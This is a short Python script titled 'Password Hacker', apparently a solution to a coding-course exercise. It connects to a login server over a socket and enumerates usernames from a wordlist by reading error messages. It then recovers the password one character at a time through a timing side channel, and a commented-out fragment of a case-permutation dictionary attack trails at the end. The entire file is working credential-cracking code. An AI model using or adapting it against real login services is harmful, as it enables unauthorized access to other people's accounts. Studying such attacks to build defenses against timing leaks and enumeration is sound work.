# Password Hacker

import socket
import sys
import itertools
import json
import time


def messagize(login, pwd):
    message = {"login": login, "password": pwd}
    return json.dumps(message)


alnum = 'abcdefghijklmnopqrstuvwxyz0123456789'

args = sys.argv
address = (args[1], int(args[2]))

with open('passwords.txt') as f:
    pass_dict = f.readlines()

with open('logins.txt') as f:
    login_dict = f.readlines()


def get_result(response):
    diz = json.loads(response)
    return diz['result']


with socket.socket() as client_socket:
    client_socket.connect(address)
    login = ''
    # Finding login
    for name in login_dict:
        message = messagize(name.strip(), '')
        client_socket.send(message.encode())
        response = client_socket.recv(1024)
        result = get_result(response.decode())
        # print(message)
        # print(result)
        if result == 'Wrong password!':
            # print('cucu')
            login = name.strip()
            break

    # Finding password

    password = ''
    for i in range(100):
        for char in alnum:
            message = messagize(login, password + char)
            # print(message)
            start = time.perf_counter()
            client_socket.send(message.encode())
            response = client_socket.recv(1024)
            end = time.perf_counter()
            total_time = end - start
            result = get_result(response.decode())
            if result == 'Wrong password!' and total_time > 0.05:
                password += char
                break
            if result == 'Connection success!':
                print(message)
                exit()
            elif result == 'Too many attempts':
                exit()

    # for password in pass_dict:
    #     macro = []
    #     for c in password:
    #         macro.append([c, c.upper()] if c != c.upper() else c)
    #     for pwd in itertools.product(*macro):
